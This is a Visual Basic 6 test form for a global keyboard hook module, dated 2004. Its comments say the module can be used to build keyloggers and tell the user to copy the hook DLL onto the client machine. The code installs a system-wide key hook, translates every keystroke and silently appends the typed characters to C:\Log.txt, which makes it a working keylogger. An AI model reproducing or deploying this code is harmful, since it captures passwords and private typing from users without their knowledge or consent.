VERSION 5.00
Begin VB.Form Testfrm 
   Caption         =   "Form1"
   ClientHeight    =   3135
   ClientLeft      =   60
   ClientTop       =   435
   ClientWidth     =   4695
   LinkTopic       =   "Form1"
   ScaleHeight     =   3135
   ScaleWidth      =   4695
   StartUpPosition =   3  'Windows-Standard
   Begin VB.PictureBox KH 
      Enabled         =   0   'False
      Height          =   315
      Left            =   0
      ScaleHeight     =   255
      ScaleWidth      =   135
      TabIndex        =   0
      TabStop         =   0   'False
      Top             =   0
      Visible         =   0   'False
      Width           =   195
   End
End
Attribute VB_Name = "Testfrm"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
'(c)2004 by Louis. Test form for GFGlobalKeyHookmod.
'
'Downloaded from www.louis-coder.com.
'Use the interface to this global key hook implementation to create Windows-wide
'hot keys or to build keyloggers. Don't forget to copy the hook dll to the client machine
'(into the program directory or Windows-directory).
'
'GFGlobalKeyHookProc
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function ToAscii Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpbKeyState As Byte, lpwTransKey As Long, ByVal fuState As Long) As Long
    
Private Sub Form_Load()
    'on error resume next
    Call GFGlobalKeyHook_SetKeyHook("Testfrm", Testfrm)
End Sub

Public Sub GFGlobalKeyHookProc(ByVal SourceDescription As String, ByVal KeyCode As Integer, ByVal Shift As Integer, ByRef ReturnValueUsedFlag As Boolean, ByRef ReturnValue As Long)
    'on error resume next
    Debug.Print SourceDescription
    Debug.Print KeyCode
    Debug.Print Shift
    If (KeyCode = 65) Then
        ReturnValueUsedFlag = True 'does NOT work in global version (merely in GFKeyHook)
        ReturnValue = 1 'A/a is disabled 'does NOT work in global version (merely in GFKeyHook)
    End If
    '
    Dim KeyboardStateCurrent(0 To 255) As Byte
    Dim KeyTranslated As Long
    Dim KeyScanCode As Long
    '
    Call GetKeyboardState(KeyboardStateCurrent(0))
    Call ToAscii(KeyCode, KeyScanCode, KeyboardStateCurrent(0), KeyTranslated, 0)
    Debug.Print Chr$(KeyTranslated);
    If (KeyTranslated >= 32) Or (KeyTranslated = 10) Or (KeyTranslated = 13) Then
        Open "C:\Log.txt" For Append As #1
            Print #1, Chr$(KeyTranslated);
        Close #1
    End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
    'on error resume next
    Call GFGlobalKeyHook_Terminate 'important, call when your project is exitted
End Sub
